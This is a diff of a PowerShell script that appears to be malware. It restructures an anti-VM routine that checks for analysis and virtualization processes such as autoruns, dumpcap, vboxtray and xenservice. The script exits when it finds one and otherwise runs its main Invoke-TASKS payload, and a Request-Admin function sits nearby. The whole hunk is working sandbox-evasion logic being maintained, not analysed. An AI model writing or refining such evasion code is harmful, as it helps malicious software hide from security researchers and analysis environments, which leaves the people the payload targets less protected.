@@ -463,8 +463,7 @@ function Request-Admin {
 }
 
 function Invoke-ANTIVM {
-    function antivm {
-        return @(
+    $processnames= @(
             "autoruns",
             "autorunsc",
             "dumpcap",
@@ -510,17 +509,19 @@ function Invoke-ANTIVM {
             "vboxtray",
             "xenservice"
         )
-    }
-    $processnames = antivm
     $detectedProcesses = $processnames | ForEach-Object {
-    $processName = $_
-    if (Get-Process -Name $processName) {$processName}}
+        $processName = $_
+        if (Get-Process -Name $processName) {
+            $processName
+        }
+    }
+
     if ($null -eq $detectedProcesses) { 
-	   Invoke-TASKS
+        Invoke-TASKS
     }
     else { 
-      Write-Output "Detected processes: $($detectedProcesses -join ', ')"
-      Exit
+        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
+        Exit
     }
 }
 
